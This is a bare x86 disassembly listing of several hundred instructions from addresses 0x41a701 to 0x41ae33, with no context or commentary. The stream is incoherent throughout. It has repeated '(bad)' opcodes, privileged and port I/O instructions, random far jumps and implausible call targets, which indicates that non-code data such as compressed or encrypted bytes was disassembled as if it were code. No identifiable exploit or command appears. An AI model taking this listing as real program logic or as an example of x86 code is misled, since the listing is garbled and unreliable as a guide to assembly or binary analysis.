  41a701:	mov    DWORD PTR [esi],ebp
  41a703:	push   ss
  41a704:	mov    ah,0xe3
  41a706:	aaa    
  41a707:	jne    0x41a71c
  41a709:	(bad)  
  41a70a:	pusha  
  41a70b:	inc    edx
  41a70c:	push   ss
  41a70d:	jmp    0x41a6ca
  41a70f:	outs   dx,BYTE PTR ds:[esi]
  41a710:	aas    
  41a711:	or     esp,DWORD PTR [ecx-0x3c]
  41a714:	mov    bl,0x3e
  41a716:	(bad)  [ebp+0x49]
  41a719:	adc    al,0x1d
  41a71b:	sub    al,0xd1
  41a71d:	cwde   
  41a71e:	pop    edx
  41a71f:	outs   dx,DWORD PTR ds:[esi]
  41a720:	test   BYTE PTR [edx-0x13],ch
  41a723:	push   ecx
  41a724:	dec    edi
  41a725:	xor    BYTE PTR [ebx+0x4e],0xb2
  41a729:	xor    al,0x3b
  41a72b:	inc    ecx
  41a72c:	rcr    DWORD PTR [ecx],0x78
  41a72f:	jne    0x41a72b
  41a731:	fldenv [edx+0x66]
  41a734:	mov    ebx,DWORD PTR [ecx-0x67]
  41a737:	and    BYTE PTR ss:[edx+0x17cb3162],ah
  41a73e:	sti    
  41a73f:	out    0x8,eax
  41a741:	retf   0x1765
  41a744:	fst    QWORD PTR [ecx+0x1]
  41a747:	into   
  41a748:	shr    dl,0x60
  41a74b:	inc    edx
  41a74c:	not    esp
  41a74e:	pop    ss
  41a74f:	not    DWORD PTR [ebp-0x78dd67a7]
  41a755:	xchg   edi,eax
  41a756:	iret   
  41a757:	(bad)  
  41a758:	in     al,dx
  41a759:	sahf   
  41a75a:	(bad)  
  41a75b:	adc    BYTE PTR ds:0x947cba8d,al
  41a761:	mov    edx,0xe8baa645
  41a766:	push   ecx
  41a767:	(bad)  
  41a768:	pop    ss
  41a769:	icebp  
  41a76a:	cmp    eax,0x8b894616
  41a76f:	xchg   ebp,eax
  41a770:	pop    ds
  41a771:	scas   eax,DWORD PTR es:[edi]
  41a772:	or     ebp,DWORD PTR [ebx]
  41a774:	(bad)  
  41a775:	pop    edx
  41a776:	stos   DWORD PTR es:[edi],eax
  41a777:	sbb    dl,al
  41a779:	in     eax,0x3b
  41a77b:	mov    al,0x43
  41a77d:	push   esi
  41a77e:	sti    
  41a77f:	inc    esi
  41a780:	jge    0x41a7ed
  41a782:	sub    BYTE PTR [edx+0x12],dh
  41a785:	sub    eax,0xb9ea35bb
  41a78a:	ss push esp
  41a78c:	cmp    al,0x8
  41a78e:	and    ah,BYTE PTR [ecx+edx*2]
  41a791:	in     eax,0x64
  41a793:	mov    ah,0x95
  41a795:	add    eax,0x279d93d0
  41a79a:	fwait
  41a79b:	mov    ecx,0x45d7549
  41a7a0:	push   esp
  41a7a1:	iret   
  41a7a2:	push   esp
  41a7a3:	aam    0x1d
  41a7a5:	sbb    eax,0xe890d6b
  41a7aa:	cmc    
  41a7ab:	add    edx,ebp
  41a7ad:	fistp  QWORD PTR [edx+ebp*8-0x76063031]
  41a7b4:	xlat   BYTE PTR ds:[ebx]
  41a7b5:	jmp    0x41a782
  41a7b7:	push   esi
  41a7b8:	mov    edi,0x8d07fd34
  41a7bd:	imul   edx,DWORD PTR [ecx+0x47],0xad2236d9
  41a7c4:	inc    ebp
  41a7c5:	bound  esi,QWORD PTR [ebx+ebp*2+0x7d]
  41a7c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7ca:	inc    ebx
  41a7cb:	fnstcw WORD PTR [esi+0x24]
  41a7ce:	add    BYTE PTR [ebx],0x8b
  41a7d1:	sti    
  41a7d2:	adc    dh,bl
  41a7d4:	xchg   BYTE PTR [edi],ch
  41a7d6:	push   edi
  41a7d7:	scas   eax,DWORD PTR es:[edi]
  41a7d8:	(bad)  
  41a7d9:	sbb    DWORD PTR [esi],edx
  41a7db:	ins    DWORD PTR es:[edi],dx
  41a7dc:	fs jb  0x41a7a3
  41a7df:	jge    0x41a797
  41a7e1:	pop    es
  41a7e2:	out    dx,eax
  41a7e3:	dec    edx
  41a7e4:	popf   
  41a7e5:	(bad)  
  41a7e6:	imul   eax,DWORD PTR [esi+0x7a],0xffffffbe
  41a7ea:	lahf   
  41a7eb:	push   edi
  41a7ec:	pop    eax
  41a7ed:	test   DWORD PTR [eax],eax
  41a7ef:	call   0x4d84:0x5b20ed4a
  41a7f6:	clc    
  41a7f7:	add    eax,DWORD PTR [edx]
  41a7f9:	xchg   BYTE PTR [edx-0x5],al
  41a7fc:	jae    0x41a821
  41a7fe:	mov    dl,0x37
  41a800:	lds    eax,FWORD PTR [ebx+0x7e]
  41a803:	mov    ebp,0xb62323b8
  41a808:	cmp    BYTE PTR [edx+0x7c],bl
  41a80b:	int    0xbf
  41a80d:	fst    QWORD PTR [edi+edx*4+0x1e49e1ae]
  41a814:	aaa    
  41a815:	js     0x41a7ac
  41a817:	sbb    eax,0xe5216eae
  41a81c:	jb     0x41a7fc
  41a81e:	cmp    bl,BYTE PTR [edi+0x46]
  41a821:	xchg   esp,eax
  41a822:	mov    bl,BYTE PTR [esi+ebp*1+0x7aa0e4f6]
  41a829:	das    
  41a82a:	mov    ebp,0x74020367
  41a82f:	fistp  DWORD PTR [edx+ebx*1-0x6c]
  41a833:	not    DWORD PTR [esp+ebx*1]
  41a836:	rol    BYTE PTR [edi],0xdd
  41a839:	das    
  41a83a:	jne    0x41a8b4
  41a83c:	mov    DWORD PTR [eax-0x141f6386],edx
  41a842:	adc    al,0x24
  41a844:	push   esi
  41a845:	mov    ah,BYTE PTR [ebx-0x58]
  41a848:	mov    eax,0x97ada13c
  41a84d:	dec    ecx
  41a84e:	inc    edx
  41a84f:	cli    
  41a850:	clc    
  41a851:	(bad)  gs:[esi]
  41a854:	xchg   ecx,eax
  41a855:	jno    0x41a804
  41a857:	sbb    eax,0xb9829b17
  41a85c:	sbb    BYTE PTR [edx-0x6f],bl
  41a85f:	nop
  41a860:	push   eax
  41a861:	adc    BYTE PTR [ebx+ecx*4],dl
  41a864:	add    BYTE PTR [edi+0xde68209],cl
  41a86a:	data16 adc al,0x40
  41a86d:	(bad)
  41a870:	jb     0x41a8d8
  41a872:	iret   
  41a873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a874:	xchg   ecx,eax
  41a875:	leave  
  41a876:	nop
  41a877:	in     al,0x9b
  41a879:	fldcw  WORD PTR [esi-0x5a5cd64a]
  41a87f:	sbb    ch,BYTE PTR [ebx+0x6b]
  41a882:	inc    eax
  41a883:	xor    bl,BYTE PTR [eax-0x1d]
  41a886:	enter  0xc2d9,0x41
  41a88a:	xor    eax,ebp
  41a88c:	jge    0x41a841
  41a88e:	inc    edi
  41a890:	mov    cl,0xcd
  41a892:	sub    DWORD PTR [edx-0x2ab5b4ef],ebx
  41a898:	bound  ecx,QWORD PTR [edi]
  41a89a:	cwde   
  41a89b:	cmp    eax,0xc373142e
  41a8a0:	int3   
  41a8a1:	jle    0x41a853
  41a8a3:	pop    ds
  41a8a4:	sbb    BYTE PTR [edi+esi*1-0x2e934055],bh
  41a8ab:	add    cl,BYTE PTR [ecx+eiz*8]
  41a8ae:	cmp    eax,0xfca06115
  41a8b3:	and    esi,edx
  41a8b5:	bound  ecx,QWORD PTR [ebx]
  41a8b7:	push   edi
  41a8b8:	mov    ebp,0x74bae665
  41a8bd:	mov    edi,0xd209a907
  41a8c2:	jno    0x41a8b7
  41a8c4:	push   eax
  41a8c5:	cs add al,0x12
  41a8c8:	dec    eax
  41a8c9:	add    DWORD PTR [edx],esi
  41a8cb:	or     esi,DWORD PTR [edx]
  41a8cd:	push   edx
  41a8ce:	adc    ebp,ecx
  41a8d0:	jmp    0xca9c:0xc502decb
  41a8d7:	rcr    DWORD PTR [edi],1
  41a8d9:	mov    dh,0x4a
  41a8db:	scas   eax,DWORD PTR es:[edi]
  41a8dc:	pop    esp
  41a8dd:	jno    0x41a8c5
  41a8df:	in     eax,0x33
  41a8e1:	mov    cl,0xda
  41a8e3:	popf   
  41a8e4:	add    al,0x9e
  41a8e6:	ret    0x26aa
  41a8e9:	push   cs
  41a8ea:	pushf  
  41a8eb:	mov    ah,0xba
  41a8ed:	jbe    0x41a8ec
  41a8ef:	stos   DWORD PTR es:[edi],eax
  41a8f0:	sub    bl,BYTE PTR [ecx+0x1a]
  41a8f3:	mov    ?,WORD PTR [ecx-0x7d10289c]
  41a8f9:	fistp  WORD PTR [esi-0x30]
  41a8fc:	cwde   
  41a8fd:	cmp    eax,0xe4a49f30
  41a902:	cmp    DWORD PTR [edx],0x27
  41a905:	aaa    
  41a906:	aas    
  41a907:	retf   0xd432
  41a90a:	bound  ebx,QWORD PTR [esp+ebx*1]
  41a90d:	inc    eax
  41a90e:	call   0x7f3f545
  41a913:	xchg   esp,eax
  41a914:	add    ebp,DWORD PTR [ebp-0x4]
  41a917:	xchg   ebp,eax
  41a918:	ffreep st(2)
  41a91a:	lods   eax,DWORD PTR ds:[esi]
  41a91b:	je     0x41a943
  41a91d:	xlat   BYTE PTR ds:[ebx]
  41a91e:	jae    0x41a961
  41a920:	hlt    
  41a921:	cmp    al,0xf8
  41a923:	stc    
  41a924:	cmp    al,0xc8
  41a926:	inc    edi
  41a927:	or     BYTE PTR [edi+0x1cbfa435],bl
  41a92d:	and    al,0x7d
  41a92f:	sub    al,0x3b
  41a931:	and    edi,DWORD PTR [esi-0x39]
  41a934:	and    bh,ah
  41a936:	lahf   
  41a937:	sub    ebp,DWORD PTR [edi-0x64]
  41a93a:	xchg   edx,eax
  41a93b:	push   ss
  41a93c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a93d:	add    edx,DWORD PTR [ecx]
  41a93f:	int3   
  41a940:	jle    0x41a924
  41a942:	dec    eax
  41a943:	arpl   WORD PTR [esi],bp
  41a945:	sbb    edx,DWORD PTR [ebx]
  41a947:	sub    al,0x64
  41a949:	leave  
  41a94a:	mov    ds:0x16e5a95e,al
  41a94f:	das    
  41a950:	into   
  41a951:	sbb    DWORD PTR [edx+0x4d68719f],edi
  41a957:	es mov ch,0x12
  41a95a:	pop    ds
  41a95b:	addr16 int 0x52
  41a95e:	rcr    BYTE PTR [edx-0x59],0x1e
  41a962:	ins    BYTE PTR es:[edi],dx
  41a963:	jmp    0x41a94e
  41a965:	xchg   edx,eax
  41a966:	sbb    esp,DWORD PTR [edx+edi*1]
  41a969:	push   esp
  41a96a:	adc    eax,0x44da466c
  41a96f:	fild   DWORD PTR [ecx]
  41a971:	jl     0x41a9e6
  41a973:	test   DWORD PTR [ecx-0x2f4132b9],esi
  41a979:	sar    cl,cl
  41a97b:	(bad)  
  41a97c:	jbe    0x41a99f
  41a97e:	jns    0x41a991
  41a980:	dec    edi
  41a981:	push   esi
  41a982:	in     al,0xdf
  41a984:	or     DWORD PTR [ebx+0x6f],ebp
  41a987:	imul   ebx,ebx,0x9ac54a22
  41a98d:	out    0xd9,al
  41a98f:	scas   al,BYTE PTR es:[edi]
  41a990:	loope  0x41a97d
  41a992:	test   eax,0x74b18c75
  41a997:	or     eax,0x2460ee29
  41a99c:	fisttp WORD PTR [eax+0xa]
  41a99f:	inc    esi
  41a9a0:	retf   0x5f42
  41a9a3:	sbb    DWORD PTR [edx-0x27a07b7c],eax
  41a9a9:	xchg   edi,eax
  41a9aa:	(bad)  
  41a9ab:	pop    ds
  41a9ac:	jb     0x41aa2d
  41a9ae:	adc    al,0xe5
  41a9b0:	in     al,0x9a
  41a9b2:	xor    al,0x9d
  41a9b4:	outs   dx,BYTE PTR ds:[esi]
  41a9b5:	dec    eax
  41a9b6:	or     al,0x14
  41a9b8:	fscale 
  41a9ba:	dec    ebp
  41a9bb:	outs   dx,BYTE PTR ds:[esi]
  41a9bc:	dec    ebx
  41a9bd:	jmp    0xe53:0xaef4d426
  41a9c4:	test   al,0x39
  41a9c6:	pop    edi
  41a9c7:	fiadd  WORD PTR [eax]
  41a9c9:	inc    ebp
  41a9ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9cb:	not    DWORD PTR [edx+0x2b596ea2]
  41a9d1:	cmp    edi,edi
  41a9d3:	mov    ah,BYTE PTR cs:[esi+0x58278bf3]
  41a9da:	hlt    
  41a9db:	rcl    DWORD PTR [edi],cl
  41a9dd:	xor    edx,DWORD PTR [eax-0x14]
  41a9e0:	mov    edi,0x53a48acb
  41a9e5:	(bad)  
  41a9e7:	and    DWORD PTR ds:0x283f429,0x65
  41a9ee:	retf   
  41a9ef:	push   esp
  41a9f0:	mov    eax,ds:0x9217a720
  41a9f5:	or     BYTE PTR [ebx+edi*2+0x6d],dl
  41a9f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9fa:	mov    ax,ds:0xe0429779
  41aa00:	mov    dl,0x3e
  41aa02:	bnd jle 0x41aa36
  41aa05:	push   ebp
  41aa06:	mov    ds:0xc53e4048,eax
  41aa0b:	mov    edx,0x812aa4cc
  41aa10:	sbb    ebp,DWORD PTR [esi-0x8]
  41aa13:	(bad)  
  41aa14:	shl    BYTE PTR [esi+0x43],cl
  41aa17:	imul   ebx,DWORD PTR [esi+0x51],0x35
  41aa1b:	push   eax
  41aa1c:	cmc    
  41aa1d:	xor    BYTE PTR [ecx+ebp*2],0x16
  41aa21:	push   ebx
  41aa22:	mov    eax,ds:0x5d60d546
  41aa27:	test   eax,0x5753abfc
  41aa2c:	les    ecx,FWORD PTR [edx-0x2674bdf9]
  41aa32:	and    DWORD PTR [ebx],0xd2a4346f
  41aa38:	das    
  41aa39:	fidiv  DWORD PTR [ebx+0x5b]
  41aa3c:	mov    bl,0xc6
  41aa3e:	das    
  41aa3f:	test   DWORD PTR [eax+0x5d],ecx
  41aa42:	gs mov dl,0x2d
  41aa45:	sbb    BYTE PTR [ebp-0x43],0xa5
  41aa49:	jg     0x41aab3
  41aa4b:	mov    eax,ds:0x279ae332
  41aa50:	xchg   edx,eax
  41aa51:	push   ss
  41aa52:	sbb    ebp,DWORD PTR [esp+esi*1+0x23]
  41aa56:	rcr    BYTE PTR [ebp+0x65632b1],1
  41aa5c:	test   al,0x87
  41aa5e:	sub    DWORD PTR ds:0xdfeffc92,ebp
  41aa64:	mov    bl,0x5b
  41aa66:	mov    dh,0x45
  41aa68:	dec    edx
  41aa69:	js     0x41aa17
  41aa6b:	inc    edi
  41aa6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa6d:	push   ebx
  41aa6e:	jl     0x41aaa8
  41aa70:	fsubr  DWORD PTR [ebx-0x3c1debe8]
  41aa76:	sbb    ecx,DWORD PTR [edi+0x19f70381]
  41aa7c:	inc    esi
  41aa7d:	adc    eax,0x818f39cb
  41aa82:	pop    ebx
  41aa83:	arpl   WORD PTR [edi],si
  41aa85:	jmp    0x706f4ab7
  41aa8a:	xor    BYTE PTR [eax+0x4b],al
  41aa8d:	xchg   esp,eax
  41aa8e:	xor    al,0x53
  41aa90:	ret    
  41aa91:	dec    ebp
  41aa92:	mov    edx,0xa6935eb
  41aa97:	(bad)  [esi+0x71]
  41aa9a:	jmp    0xcf5da54c
  41aa9f:	aaa    
  41aaa0:	aaa    
  41aaa1:	sub    al,0x71
  41aaa3:	dec    ecx
  41aaa4:	jno    0x41aacc
  41aaa6:	mov    ?,WORD PTR [ebx+ecx*2-0x68b02f4e]
  41aaad:	mov    edi,gs
  41aaaf:	adc    al,0xe9
  41aab1:	call   0xa5a16aae
  41aab6:	in     eax,dx
  41aab7:	xor    eax,0x35b0c04
  41aabc:	cli    
  41aabd:	dec    eax
  41aabe:	(bad)  
  41aabf:	xor    eax,0x27ff95d5
  41aac4:	cli    
  41aac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aac6:	mov    BYTE PTR [ecx-0x13],bl
  41aac9:	sbb    bl,BYTE PTR [esp+edi*1-0x2]
  41aacd:	add    eax,0xc0ccdc61
  41aad2:	mov    eax,ds:0x3474508b
  41aad7:	dec    esi
  41aad8:	pop    ecx
  41aad9:	cmp    ch,BYTE PTR [eax]
  41aadb:	mov    esp,0xe8541a68
  41aae0:	pop    esi
  41aae1:	mov    esi,0x1f4ef969
  41aae6:	jae    0x41ab0a
  41aae8:	stos   BYTE PTR es:[edi],al
  41aae9:	jo     0x41aa99
  41aaeb:	lock fsubr DWORD PTR [edi+0x4f]
  41aaef:	enter  0xc0d6,0x71
  41aaf3:	jne    0x41aaaa
  41aaf5:	in     eax,dx
  41aaf6:	je     0x41ab17
  41aaf8:	cs out 0x92,eax
  41aafb:	xor    BYTE PTR [edx-0x16],bl
  41aafe:	dec    ecx
  41aaff:	jb     0x41aa88
  41ab01:	xchg   DWORD PTR [ebp+0x47],ecx
  41ab04:	sbb    BYTE PTR [eax+0x2f],ch
  41ab07:	xor    al,0xca
  41ab09:	cmp    DWORD PTR [ecx-0x52],esi
  41ab0c:	out    dx,al
  41ab0d:	pop    edx
  41ab0e:	cmc    
  41ab0f:	and    al,0x51
  41ab11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab12:	inc    ecx
  41ab13:	sbb    al,0x8d
  41ab15:	mov    al,cl
  41ab17:	stos   DWORD PTR es:[edi],eax
  41ab18:	mov    cl,0x7b
  41ab1a:	lds    cx,DWORD PTR [edx-0x7e]
  41ab1e:	sbb    DWORD PTR [eax],edi
  41ab20:	push   esi
  41ab21:	sahf   
  41ab22:	xor    eax,0xa80045f2
  41ab27:	lock mov ah,0x0
  41ab2a:	(bad)  
  41ab2b:	call   0xf46735a3
  41ab30:	push   eax
  41ab31:	adc    eax,0x42819a29
  41ab36:	push   ecx
  41ab37:	mov    al,0xfe
  41ab39:	imul   esi,DWORD PTR [ecx-0x7a],0xeb9ee23e
  41ab40:	iret   
  41ab41:	(bad)  
  41ab42:	leave  
  41ab43:	fwait
  41ab44:	arpl   WORD PTR [edi],dx
  41ab46:	xlat   BYTE PTR ds:[ebx]
  41ab47:	xchg   edi,eax
  41ab48:	sahf   
  41ab49:	sub    eax,0xba654b46
  41ab4e:	sahf   
  41ab4f:	dec    ebp
  41ab50:	sub    eax,0x65869a21
  41ab55:	and    bh,dh
  41ab57:	jb     0x41aba7
  41ab59:	inc    ebx
  41ab5a:	inc    esp
  41ab5b:	outs   dx,BYTE PTR ds:[esi]
  41ab5c:	push   ss
  41ab5d:	mov    edi,0xb8bc4652
  41ab62:	cmp    DWORD PTR [eax],ebx
  41ab64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab65:	call   0xe20235e2
  41ab6a:	test   eax,0x5a374d86
  41ab6f:	mov    ?,WORD PTR [ecx-0xe185f6d]
  41ab75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab76:	mov    ch,0xa1
  41ab78:	outs   dx,DWORD PTR ds:[esi]
  41ab79:	xor    ch,BYTE PTR [edi-0x72]
  41ab7c:	int3   
  41ab7d:	in     eax,0x1a
  41ab7f:	sahf   
  41ab80:	ror    BYTE PTR [eax],cl
  41ab82:	xor    al,BYTE PTR [edi]
  41ab84:	mov    ds:0xf8a776fc,eax
  41ab89:	shl    cl,1
  41ab8b:	push   eax
  41ab8c:	push   esi
  41ab8d:	mov    DWORD PTR [ebp-0x4028b21a],ecx
  41ab93:	ret    0xa3f4
  41ab96:	sbb    bh,BYTE PTR [ebx-0x770cb757]
  41ab9c:	jae    0x41ac0c
  41ab9e:	mov    edx,0x6f87a619
  41aba3:	mov    bh,0xa2
  41aba5:	inc    esi
  41aba6:	or     eax,DWORD PTR [ecx+edi*2+0x7fca8bd7]
  41abad:	cdq    
  41abae:	test   eax,0x96433d70
  41abb3:	jne    0x41ab3a
  41abb5:	repnz enterw 0xf70a,0x9a
  41abbb:	mov    ebp,0xf968577
  41abc0:	in     al,dx
  41abc1:	sbb    al,0x4c
  41abc3:	fcomp  DWORD PTR [ebx]
  41abc5:	mov    al,ds:0x9b52e502
  41abca:	pop    ebx
  41abcb:	mov    ecx,0xbdcd0050
  41abd0:	xchg   ebx,eax
  41abd1:	shr    DWORD PTR [ebx],1
  41abd3:	jno    0x41ac17
  41abd5:	add    DWORD PTR [esi],0x77
  41abd8:	idiv   DWORD PTR [eax+0xa]
  41abdb:	in     al,dx
  41abdc:	jp     0x41abc5
  41abde:	dec    esp
  41abdf:	mov    cs,edi
  41abe1:	enter  0x17a6,0x5e
  41abe5:	sub    al,0xb3
  41abe7:	fnstsw WORD PTR [edi-0x11]
  41abea:	pop    eax
  41abeb:	outs   dx,BYTE PTR ds:[esi]
  41abec:	data16 mov ch,0x88
  41abef:	inc    eax
  41abf0:	push   ecx
  41abf1:	ja     0x41abeb
  41abf3:	push   edx
  41abf4:	daa    
  41abf5:	aam    0xe0
  41abf7:	inc    ebp
  41abf8:	into   
  41abf9:	lds    eax,FWORD PTR [edx]
  41abfb:	into   
  41abfc:	add    edi,DWORD PTR [ebx]
  41abfe:	addr16 and ebx,edi
  41ac01:	sti    
  41ac02:	add    dh,BYTE PTR [edx-0x73]
  41ac05:	push   0xce065ed4
  41ac0a:	jp     0x41ac57
  41ac0c:	(bad)  
  41ac0d:	in     eax,0x42
  41ac0f:	js     0x41ac8f
  41ac11:	idiv   DWORD PTR [ebx+0x5420ab8e]
  41ac17:	into   
  41ac18:	js     0x41abdb
  41ac1a:	cld    
  41ac1b:	pop    es
  41ac1c:	inc    esi
  41ac1d:	imul   esp,DWORD PTR [ebx+edi*8+0x756de36b],0xd0357248
  41ac28:	call   0x7290f9cb
  41ac2d:	fnstenv [ebp+0x49152f4a]
  41ac33:	sbb    DWORD PTR [edx-0x3c],0xa8d610ca
  41ac3a:	sbb    ah,BYTE PTR [ebx]
  41ac3c:	and    ecx,ebx
  41ac3e:	pushf  
  41ac3f:	push   edx
  41ac40:	push   eax
  41ac41:	xchg   esp,eax
  41ac42:	xchg   ebx,eax
  41ac43:	jb     0x41ac9f
  41ac45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac46:	lods   al,BYTE PTR ds:[esi]
  41ac47:	rcr    DWORD PTR [ecx+0x13],0xf7
  41ac4b:	mov    ah,0x2
  41ac4d:	std    
  41ac4e:	repnz or al,BYTE PTR [esi]
  41ac51:	lahf   
  41ac52:	xchg   ebx,eax
  41ac53:	adc    DWORD PTR [ebx+0x5e],ecx
  41ac56:	ret    
  41ac57:	jne    0x41acb3
  41ac59:	hlt    
  41ac5a:	not    DWORD PTR [ebp-0x7eb64e1c]
  41ac60:	push   ecx
  41ac61:	dec    eax
  41ac62:	(bad)  
  41ac63:	out    dx,al
  41ac64:	cmp    al,0x8
  41ac66:	ja     0x41ac3f
  41ac68:	xor    BYTE PTR [ecx],cl
  41ac6a:	adc    al,0x9
  41ac6c:	sbb    ch,bh
  41ac6e:	mov    edx,0x375a822b
  41ac73:	fldcw  WORD PTR ds:0x5959acf4
  41ac79:	(bad)  
  41ac7a:	nop
  41ac7b:	icebp  
  41ac7c:	imul   ebp,ebp,0xd94f1196
  41ac82:	cmp    eax,0xef3f5f1b
  41ac87:	imul   eax,DWORD PTR [edx+eax*1-0x5b],0xc0044512
  41ac8f:	add    DWORD PTR [edx-0x2ac878aa],esi
  41ac95:	into   
  41ac96:	aas    
  41ac97:	test   DWORD PTR [ebp-0x5c],0xd0fb822d
  41ac9e:	and    ebp,eax
  41aca0:	jo     0x41ad0a
  41aca2:	sbb    eax,0xc7e82c8a
  41aca7:	or     ecx,0x9b2ac7e5
  41acad:	gs (bad) 
  41acaf:	out    dx,al
  41acb0:	sbb    eax,0x8519d4a4
  41acb5:	cli    
  41acb6:	jmp    0x8566:0x40a7c09c
  41acbd:	leave  
  41acbe:	aad    0xe3
  41acc0:	push   ebp
  41acc1:	scas   eax,DWORD PTR es:[edi]
  41acc2:	or     al,0xa3
  41acc4:	adc    eax,0xc7e28f67
  41acc9:	into   
  41acca:	stc    
  41accb:	pop    esi
  41accc:	outs   dx,DWORD PTR ds:[esi]
  41accd:	push   esp
  41acce:	sub    cl,BYTE PTR [ecx+0x4c]
  41acd1:	push   ebp
  41acd2:	cmp    BYTE PTR [eax+0x7c],0x50
  41acd6:	cli    
  41acd7:	sub    ebx,DWORD PTR [edx+ebp*1-0x6b21fd94]
  41acde:	mov    esi,0x5b49499b
  41ace3:	jae    0x41ac6c
  41ace5:	adc    DWORD PTR [ebp+ecx*4-0x7d2748a8],ebp
  41acec:	pop    ebx
  41aced:	sbb    ax,0x5cb8
  41acf1:	jnp    0x41ad6d
  41acf3:	or     ebx,ebp
  41acf5:	lock loop 0x41acf7
  41acf8:	adc    BYTE PTR [eax-0x31bc80b1],al
  41acfe:	add    BYTE PTR [esi+eax*8+0x49],bl
  41ad02:	sbb    eax,0xeb6de16f
  41ad07:	or     bl,bl
  41ad09:	sub    cl,BYTE PTR [edx]
  41ad0b:	in     al,dx
  41ad0c:	cmp    bh,BYTE PTR [edx-0x4874e3be]
  41ad12:	inc    ebx
  41ad13:	dec    esi
  41ad14:	jecxz  0x41ad41
  41ad16:	sbb    dh,BYTE PTR [esi-0x2b3a9f4d]
  41ad1c:	mov    ecx,0xca948c64
  41ad21:	cmp    DWORD PTR [ecx+0x2592bb2b],esi
  41ad27:	(bad)  
  41ad28:	out    dx,eax
  41ad29:	test   eax,0x17011d88
  41ad2e:	pop    eax
  41ad2f:	hlt    
  41ad30:	stc    
  41ad31:	xchg   edi,eax
  41ad32:	xor    BYTE PTR [eax-0x5e5a4959],al
  41ad38:	xchg   esp,eax
  41ad39:	jns    0x41ad3e
  41ad3b:	int3   
  41ad3c:	adc    ah,al
  41ad3e:	fwait
  41ad3f:	cmp    BYTE PTR [ebx+0xd],al
  41ad42:	data16 fwait
  41ad44:	lds    ebx,FWORD PTR [eax]
  41ad46:	outs   dx,BYTE PTR ds:[esi]
  41ad47:	fisttp WORD PTR [ebx]
  41ad49:	inc    ebx
  41ad4a:	(bad)  [esi+0x7b]
  41ad4d:	dec    ebx
  41ad4e:	xchg   edx,eax
  41ad4f:	fwait
  41ad50:	test   BYTE PTR [esi],ch
  41ad52:	cmp    eax,0xd9c7f309
  41ad57:	fwait
  41ad58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad59:	ret    0xdb2
  41ad5c:	mov    ss,ecx
  41ad5e:	sub    esp,edx
  41ad60:	cdq    
  41ad61:	std    
  41ad62:	mov    edx,ss
  41ad64:	mov    ch,0x8a
  41ad66:	push   es
  41ad67:	popa   
  41ad68:	jg     0x41adcf
  41ad6a:	sub    edi,0xd06fb793
  41ad70:	xchg   edi,eax
  41ad71:	shr    BYTE PTR [ecx+0x4d46a4ec],0x73
  41ad78:	and    eax,0x5b0eeb04
  41ad7d:	retf   
  41ad7e:	add    al,0x2d
  41ad80:	outs   dx,BYTE PTR ds:[esi]
  41ad81:	xor    dl,BYTE PTR [eax-0xc]
  41ad84:	pop    esi
  41ad85:	ins    BYTE PTR es:[edi],dx
  41ad86:	into   
  41ad87:	cmp    edx,ebx
  41ad89:	pushf  
  41ad8a:	(bad)  
  41ad8b:	xchg   ebp,eax
  41ad8c:	xor    ecx,DWORD PTR [eax+0x5cfe3e6]
  41ad92:	loop   0x41ad96
  41ad94:	call   0x585a:0x7daff1ef
  41ad9b:	dec    esi
  41ad9c:	push   edi
  41ad9d:	jo     0x41ad27
  41ad9f:	in     al,0x9e
  41ada1:	push   esi
  41ada2:	xchg   edx,eax
  41ada3:	and    DWORD PTR [ebx-0x274312fc],esp
  41ada9:	push   ss
  41adaa:	adc    ecx,DWORD PTR [ecx-0x7b]
  41adad:	cmc    
  41adae:	xlat   BYTE PTR ds:[ebx]
  41adaf:	ror    dh,cl
  41adb1:	fadd   st(1),st
  41adb3:	push   0x4476db61
  41adb8:	jle    0x41ad66
  41adba:	mov    bl,0xa8
  41adbc:	dec    ebp
  41adbd:	in     eax,0x94
  41adbf:	lea    ebx,[esi+0x38d4f4f6]
  41adc5:	arpl   WORD PTR [ebp+0x41],si
  41adc8:	bnd ret 
  41adca:	jecxz  0x41ada7
  41adcc:	(bad)  
  41adcd:	xchg   ebp,eax
  41adce:	adc    eax,0xbb717574
  41add3:	cwde   
  41add4:	and    BYTE PTR [esi],al
  41add6:	icebp  
  41add7:	pop    ebx
  41add8:	clc    
  41add9:	mov    dh,0xae
  41addb:	xchg   ebp,eax
  41addc:	xchg   ebx,eax
  41addd:	daa    
  41adde:	xchg   edi,eax
  41addf:	xor    al,0xcd
  41ade1:	out    0xb9,eax
  41ade3:	and    al,BYTE PTR [ecx+0xd]
  41ade6:	cmc    
  41ade7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ade8:	(bad)  
  41ade9:	jmp    0x41adfd
  41adeb:	ja     0x41ad92
  41aded:	daa    
  41adee:	(bad)  
  41adef:	in     al,0x84
  41adf1:	ficomp DWORD PTR [ebp-0x4b9afac]
  41adf7:	pop    esi
  41adf8:	xchg   edx,eax
  41adf9:	pop    eax
  41adfa:	and    al,bl
  41adfc:	ss dec eax
  41adfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adff:	shr    edi,0xda
  41ae02:	add    dl,dl
  41ae04:	mov    ebx,0x81630558
  41ae09:	daa    
  41ae0a:	int3   
  41ae0b:	ss (bad) 
  41ae0d:	mov    esp,ecx
  41ae0f:	sub    al,0x4d
  41ae11:	enter  0xa8e0,0x74
  41ae15:	les    ecx,FWORD PTR [esi-0x4fac953c]
  41ae1b:	sahf   
  41ae1c:	pushf  
  41ae1d:	and    eax,0xbaa2bb98
  41ae22:	mov    edx,0x662296ee
  41ae27:	fsub   DWORD PTR [ecx+0x2fea4973]
  41ae2d:	fld    DWORD PTR [ebx+ebx*2-0x30]
  41ae31:	scas   al,BYTE PTR es:[edi]
  41ae32:	inc    esp
  41ae33:	xor    al,bl
